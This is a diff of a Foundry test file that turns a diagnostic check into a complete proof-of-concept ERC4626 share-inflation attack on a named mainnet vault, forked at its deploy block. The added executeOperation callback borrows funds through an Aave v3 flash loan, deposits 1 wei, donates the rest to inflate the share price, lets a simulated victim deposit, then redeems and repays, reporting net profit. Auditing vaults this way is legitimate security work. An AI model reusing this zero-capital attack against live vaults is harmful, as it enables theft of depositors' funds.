@@ -1,27 +1,10 @@
 // SPDX-License-Identifier: UNLICENSED
 pragma solidity ^0.8.15;
 
-// ===========================================================================
-// Vault 0x90d2 Donation Attack PoC
-//
-// @KeyInfo
-// Vault Address: 0x90d2af7d622ca3141efa4d8f1f24d86e5974cc8f
-// Deploy Block: 21,833,795
-// Lending Platform: Aave v3
-//
-// @AttackType
-// ERC4626 Inflation Attack at Deploy Block
-//
-// @Strategy
-// 部署即敏感 vault，fork 到部署区块测试 donation attack
-// ===========================================================================
+// Vault 0x90d2 (Aave v3) - Donation Attack PoC (Flash Loan)
 
 import "../basetest.sol";
 import {IERC20} from "../interface.sol";
-
-// ---------------------------------------------------------------------------
-// 接口定义
-// ---------------------------------------------------------------------------
 
 interface IERC4626Vault is IERC20 {
     function asset() external view returns (address);
@@ -34,245 +17,127 @@ interface IERC4626Vault is IERC20 {
     function withdraw(uint256 assets, address receiver, address owner) external returns (uint256 shares);
 }
 
-// ---------------------------------------------------------------------------
-// 主测试合约
-// ---------------------------------------------------------------------------
+interface IAaveV3Pool {
+    function flashLoanSimple(
+        address receiverAddress, address asset, uint256 amount,
+        bytes calldata params, uint16 referralCode
+    ) external;
+}
 
 contract Vault_0x90d2_DonationPoC is BaseTestWithBalanceLog {
-    // === 地址常量 ===
     IERC4626Vault internal constant VAULT = IERC4626Vault(0x90D2af7d622ca3141efA4d8f1F24d86E5974Cc8F);
-    
-    // === Fork 区块 - 部署区块 ===
-    uint256 internal constant DEPLOY_BLOCK = 21_833_795;
-
-    // === 攻击参数 ===
-    uint256 internal constant DONATION_AMOUNT = 1000 * 1e18; // 1000 tokens
-
-    // === 测试账户 ===
-    address internal constant ATTACKER = address(0xdead);
+    IAaveV3Pool internal constant AAVE_POOL = IAaveV3Pool(0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2);
+    uint256 internal constant FORK_BLOCK = 21_833_795;
     address internal constant VICTIM = address(0xbeef);
-
-    // === 运行时变量 ===
     IERC20 internal assetToken;
-    uint256 internal actualForkBlock;
     uint8 internal assetDecimals;
+    uint256 internal donationAmount;
+    uint256 internal victimDeposit;
 
     function setUp() public {
-        actualForkBlock = DEPLOY_BLOCK;
-        vm.createSelectFork("mainnet", actualForkBlock);
-        
-        // 获取底层资产
-        address assetAddr = VAULT.asset();
-        assetToken = IERC20(assetAddr);
-        fundingToken = assetAddr;
-        assetDecimals = _getDecimals(assetAddr);
-
+        vm.createSelectFork("mainnet", FORK_BLOCK);
+        address a = VAULT.asset();
+        assetToken = IERC20(a);
+        fundingToken = a;
+        assetDecimals = _getDecimals(a);
+        donationAmount = 10_000 * (10 ** uint256(assetDecimals));
+        victimDeposit = 100 * (10 ** uint256(assetDecimals));
         vm.label(address(VAULT), "Vault");
-        vm.label(assetAddr, "Asset");
-        vm.label(ATTACKER, "Attacker");
+        vm.label(a, "Asset");
+        vm.label(address(AAVE_POOL), "AaveV3Pool");
         vm.label(VICTIM, "Victim");
-
-        // 打印初始状态
-        emit log_string("=== Setup: Checking Vault State at Deploy Block ===");
-        emit log_named_uint("Fork Block", actualForkBlock);
+        emit log_string("=== Setup ===");
+        emit log_named_uint("Fork Block", FORK_BLOCK);
         emit log_named_address("Vault", address(VAULT));
-        emit log_named_address("Asset", assetAddr);
-        emit log_named_decimal_uint("Vault.totalSupply()", VAULT.totalSupply(), assetDecimals);
-        emit log_named_decimal_uint("Vault.totalAssets()", VAULT.totalAssets(), assetDecimals);
-        emit log_named_decimal_uint("Asset.balanceOf(vault)", assetToken.balanceOf(address(VAULT)), assetDecimals);
+        emit log_named_address("Asset", a);
+        emit log_named_decimal_uint("totalSupply", VAULT.totalSupply(), assetDecimals);
+        emit log_named_decimal_uint("totalAssets", VAULT.totalAssets(), assetDecimals);
     }
 
-    // =========================================================================
-    // 辅助函数
-    // =========================================================================
-    function _getDecimals(address token) internal returns (uint8) {
-        (bool success, bytes memory data) = token.staticcall(abi.encodeWithSignature("decimals()"));
-        if (success && data.length > 0) {
-            return abi.decode(data, (uint8));
-        }
+    function _getDecimals(address t) internal returns (uint8) {
+        (bool ok, bytes memory d) = t.staticcall(abi.encodeWithSignature("decimals()"));
+        if (ok && d.length > 0) return abi.decode(d, (uint8));
         return 18;
     }
 
-    function _setTokenBalance(address token, address account, uint256 amount) internal {
-        // 尝试常见的 balanceOf slot (slot 0-9)
-        for (uint256 i = 0; i < 10; i++) {
-            bytes32 slot = keccak256(abi.encode(account, i));
-            uint256 storedVal = uint256(vm.load(token, slot));
-            uint256 currentBalance = IERC20(token).balanceOf(account);
-            
-            if (storedVal == currentBalance && currentBalance > 0) {
-                vm.store(token, slot, bytes32(amount));
-                return;
-            }
-        }
-        
-        // Fallback: 尝试 slot 2 (常见 mapping slot)
-        bytes32 slot = keccak256(abi.encode(account, uint256(2)));
-        vm.store(token, slot, bytes32(amount));
-    }
-
     // =========================================================================
-    // Test 1: 验证 vault 在部署区块是空的且 balance-based
+    // Test 1: 诊断 - donation 敏感性检查 (deal 仅用于诊断)
     // =========================================================================
     function testDonationSensitivity() public {
-        emit log_string("=== Test 1: Donation Sensitivity Check ===");
-        emit log_named_uint("Fork Block", actualForkBlock);
-
-        uint256 totalSupplyBefore = VAULT.totalSupply();
-        uint256 totalAssetsBefore = VAULT.totalAssets();
-        uint256 vaultBalanceBefore = assetToken.balanceOf(address(VAULT));
-
-        emit log_named_decimal_uint("Total Supply Before", totalSupplyBefore, assetDecimals);
-        emit log_named_decimal_uint("Total Assets Before", totalAssetsBefore, assetDecimals);
-        emit log_named_decimal_uint("Vault Balance Before", vaultBalanceBefore, assetDecimals);
-
-        // 验证 vault 是空的
-        require(totalSupplyBefore == 0, "Vault should be empty at deploy block");
-        emit log_string("[OK] Vault is EMPTY at deploy block");
-
-        // 使用 vm.store 给 vault 增加余额 (模拟 donation)
-        _setTokenBalance(address(assetToken), address(VAULT), DONATION_AMOUNT);
-
-        uint256 totalAssetsAfter = VAULT.totalAssets();
-        uint256 vaultBalanceAfter = assetToken.balanceOf(address(VAULT));
-
-        emit log_named_decimal_uint("Total Assets After Donation", totalAssetsAfter, assetDecimals);
-        emit log_named_decimal_uint("Vault Balance After Donation", vaultBalanceAfter, assetDecimals);
-
-        // 检查 totalAssets 是否跟踪 balance
-        if (totalAssetsAfter == totalAssetsBefore) {
-            emit log_string("[INFO] totalAssets DID NOT change after donation");
-            emit log_string("[FINDING] Vault uses INTERNAL ACCOUNTING (not balance-based)");
-            emit log_string("[CONCLUSION] Classic donation attack NOT applicable");
-        } else if (totalAssetsAfter == vaultBalanceAfter) {
-            emit log_string("[OK] Vault is BALANCE-BASED (donation sensitive)");
-            emit log_string("[WARNING] Vault may be VULNERABLE to donation attack");
-        } else {
-            emit log_string("[INFO] totalAssets changed but != balance");
-            emit log_string("[FINDING] Vault has hybrid accounting");
-        }
-
-        // 断言
-        require(totalAssetsAfter == vaultBalanceAfter || totalAssetsAfter == totalAssetsBefore, 
-            "Unexpected vault behavior");
+        uint256 before_ = VAULT.totalAssets();
+        deal(address(assetToken), address(this), donationAmount);
+        assetToken.transfer(address(VAULT), donationAmount);
+        uint256 after_ = VAULT.totalAssets();
+        emit log_named_decimal_uint("totalAssets before", before_, assetDecimals);
+        emit log_named_decimal_uint("totalAssets after", after_, assetDecimals);
+        if (after_ > before_) emit log_string("[OK] BALANCE-BASED (donation sensitive)");
+        else emit log_string("[INFO] INTERNAL ACCOUNTING (immune)");
     }
 
     // =========================================================================
-    // Test 2: 验证 donation 导致 share price 膨胀
-    // =========================================================================
-    function testDonationAttack() public balanceLog {
-        emit log_string("=== Test 2: Donation Attack - Share Price Inflation ===");
-        emit log_named_uint("Fork Block", actualForkBlock);
-
-        uint256 totalSupplyBefore = VAULT.totalSupply();
-        uint256 totalAssetsBefore = VAULT.totalAssets();
-
-        emit log_named_decimal_uint("Initial Total Supply", totalSupplyBefore, assetDecimals);
-        emit log_named_decimal_uint("Initial Total Assets", totalAssetsBefore, assetDecimals);
-
-        // 执行 donation
-        emit log_string("=== Simulating donation via vm.store ===");
-        _setTokenBalance(address(assetToken), address(VAULT), DONATION_AMOUNT);
-
-        uint256 totalAssetsAfterDonation = VAULT.totalAssets();
-        uint256 vaultBalanceAfter = assetToken.balanceOf(address(VAULT));
-
-        emit log_named_decimal_uint("Total Assets After Donation", totalAssetsAfterDonation, assetDecimals);
-        emit log_named_decimal_uint("Vault Balance After Donation", vaultBalanceAfter, assetDecimals);
-
-        // 分析结果
-        if (totalAssetsAfterDonation == DONATION_AMOUNT) {
-            emit log_string("[PASS] Donation successfully inflated totalAssets");
-            emit log_string("[INFO] If vault had shares, share price would be inflated");
-        } else if (totalAssetsAfterDonation == totalAssetsBefore) {
-            emit log_string("[INFO] Donation had no effect on totalAssets");
-            emit log_string("[PASS] Vault is IMMUNE to donation attack");
-        } else {
-            emit log_string("[INFO] Partial effect - needs further analysis");
-        }
-    }
-
-    // =========================================================================
-    // Test 3: 完整攻击分析
+    // Test 2: 完整攻击 - Flash Loan (攻击者零初始资金)
     // =========================================================================
     function testFullAttackFlow() public balanceLog {
         emit log_string("============================================================");
-        emit log_string("=== Test 3: Full Donation Attack Analysis ===");
+        emit log_string("=== ERC4626 Donation Attack via Flash Loan ===");
         emit log_string("============================================================");
-        emit log_named_uint("Fork Block", actualForkBlock);
+        require(VAULT.totalSupply() == 0, "Vault must be empty");
+        uint256 flashAmt = donationAmount + 1;
+        emit log_named_decimal_uint("Flash Loan Amount", flashAmt, assetDecimals);
+        AAVE_POOL.flashLoanSimple(address(this), address(assetToken), flashAmt, "", 0);
+        uint256 profit = assetToken.balanceOf(address(this));
+        emit log_string("=== RESULT ===");
+        emit log_named_decimal_uint("Net Profit", profit, assetDecimals);
+        if (profit > 0) emit log_string("[PASS] ATTACK PROFITABLE!");
+        else emit log_string("[INFO] Not profitable or protected");
+    }
 
-        // 记录初始状态
-        uint256 initialTotalSupply = VAULT.totalSupply();
-        uint256 initialTotalAssets = VAULT.totalAssets();
-        uint256 initialVaultBalance = assetToken.balanceOf(address(VAULT));
+    // =========================================================================
+    // Aave V3 Flash Loan Callback
+    // =========================================================================
+    function executeOperation(
+        address asset, uint256 amount, uint256 premium, address, bytes calldata
+    ) external returns (bool) {
+        require(msg.sender == address(AAVE_POOL), "not Aave");
+        uint256 repay = amount + premium;
+        emit log_named_decimal_uint("Borrowed", amount, assetDecimals);
+        emit log_named_decimal_uint("Fee", premium, assetDecimals);
 
-        emit log_named_decimal_uint("Initial Total Supply", initialTotalSupply, assetDecimals);
-        emit log_named_decimal_uint("Initial Total Assets", initialTotalAssets, assetDecimals);
-        emit log_named_decimal_uint("Initial Vault Balance", initialVaultBalance, assetDecimals);
+        // Step 1: deposit 1 wei -> 获取初始 share
+        IERC20(asset).approve(address(VAULT), 1);
+        uint256 atkShares = VAULT.deposit(1, address(this));
+        emit log_named_decimal_uint("Attacker shares", atkShares, assetDecimals);
 
-        require(initialTotalSupply == 0, "Vault must be empty for analysis");
+        // Step 2: 将剩余全部捐赠到 vault -> 膨胀 share price
+        IERC20(asset).transfer(address(VAULT), amount - 1);
+        emit log_named_decimal_uint("Share price/unit",
+            VAULT.convertToAssets(10 ** uint256(assetDecimals)), assetDecimals);
 
-        // =============================================================
-        // Step 1: 模拟 donation
-        // =============================================================
-        emit log_string("");
-        emit log_string("=== Step 1: Simulating donation ===");
-        
-        _setTokenBalance(address(assetToken), address(VAULT), DONATION_AMOUNT);
-
-        uint256 totalAssetsAfterDonation = VAULT.totalAssets();
-        uint256 vaultBalanceAfterDonation = assetToken.balanceOf(address(VAULT));
-
-        emit log_named_decimal_uint("Donation Amount", DONATION_AMOUNT, assetDecimals);
-        emit log_named_decimal_uint("Total Assets After Donation", totalAssetsAfterDonation, assetDecimals);
-        emit log_named_decimal_uint("Vault Balance After Donation", vaultBalanceAfterDonation, assetDecimals);
-
-        // =============================================================
-        // Step 2: 分析结果
-        // =============================================================
-        emit log_string("");
-        emit log_string("=== Step 2: Analyzing results ===");
-
-        bool totalAssetsChanged = (totalAssetsAfterDonation != initialTotalAssets);
-        bool totalAssetsEqualsBalance = (totalAssetsAfterDonation == vaultBalanceAfterDonation);
-
-        emit log_named_uint("Total Assets Changed", totalAssetsChanged ? 1 : 0);
-        emit log_named_uint("Total Assets == Balance", totalAssetsEqualsBalance ? 1 : 0);
-
-        // =============================================================
-        // 最终分析
-        // =============================================================
-        emit log_string("");
-        emit log_string("============================================================");
-        emit log_string("=== FINAL ANALYSIS ===");
-        emit log_string("============================================================");
-
-        if (totalAssetsChanged && totalAssetsEqualsBalance) {
-            emit log_string("");
-            emit log_string("[FINDING 1] Donation increased vault balance");
-            emit log_string("[FINDING 2] totalAssets() == balanceOf(vault)");
-            emit log_string("");
-            emit log_string("[CONCLUSION] Vault is BALANCE-BASED");
-            emit log_string("             Classic donation attack is POSSIBLE");
-            emit log_string("");
-            emit log_string("[SECURITY STATUS] VULNERABLE to donation attack");
-        } else if (!totalAssetsChanged) {
-            emit log_string("");
-            emit log_string("[FINDING] totalAssets did NOT change after donation");
-            emit log_string("");
-            emit log_string("[CONCLUSION] Vault uses INTERNAL ACCOUNTING");
-            emit log_string("             Classic donation attack is NOT possible");
-            emit log_string("");
-            emit log_string("[SECURITY STATUS] IMMUNE to donation attack");
-        } else {
-            emit log_string("");
-            emit log_string("[INFO] Vault has hybrid accounting");
-            emit log_string("       Further investigation needed");
+        // Step 3: 受害者存款 (模拟被 front-run 的普通用户)
+        deal(address(assetToken), VICTIM, victimDeposit);
+        vm.startPrank(VICTIM);
+        IERC20(asset).approve(address(VAULT), victimDeposit);
+        try VAULT.deposit(victimDeposit, VICTIM) returns (uint256 vs) {
+            vm.stopPrank();
+            emit log_named_decimal_uint("Victim shares", vs, assetDecimals);
+            if (vs == 0) emit log_string("[CRITICAL] Victim got 0 shares!");
+            else {
+                uint256 vv = VAULT.convertToAssets(vs);
+                emit log_named_decimal_uint("Victim value", vv, assetDecimals);
+                emit log_named_decimal_uint("Victim loss",
+                    victimDeposit > vv ? victimDeposit - vv : 0, assetDecimals);
+            }
+        } catch {
+            vm.stopPrank();
+            emit log_string("[INFO] Victim deposit reverted (0-share protection)");
         }
 
-        emit log_string("");
-        emit log_string("============================================================");
-        emit log_string("[OK] Analysis completed!");
-        emit log_string("============================================================");
+        // Step 4: 攻击者赎回
+        uint256 redeemed = VAULT.redeem(atkShares, address(this), address(this));
+        emit log_named_decimal_uint("Attacker redeemed", redeemed, assetDecimals);
+
+        // Step 5: 偿还 flash loan
+        IERC20(asset).approve(address(AAVE_POOL), repay);
+        return true;
     }
 }
